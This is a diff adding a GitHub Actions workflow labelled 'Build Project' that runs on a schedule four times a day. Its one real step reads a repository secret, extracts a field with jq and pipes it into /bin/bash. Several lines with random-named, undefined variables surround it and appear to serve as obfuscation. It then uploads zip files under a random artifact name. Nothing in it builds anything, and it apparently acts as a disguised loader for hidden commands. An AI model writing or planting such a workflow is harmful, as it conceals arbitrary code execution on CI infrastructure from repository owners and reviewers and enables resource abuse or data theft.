@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '37 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          zi9: ${{ secrets.zi9 }}
+        run: |
+          printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
+          echo $ic0531 | jq -r .c6 | /bin/bash
+          echo $etsy36 | jq -r .mkad48 | /bin/bash
+          echo $mbsyk27354 | jq -r .hego42643 | /bin/bash
+          echo $lgf41 | jq -r .ueb38 | /bin/bash
+          printf '%s' "$weq64" | jq -r .qqch6230 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: DQcZFPeY
+          path: "*.zip"
+          retention-days: 1
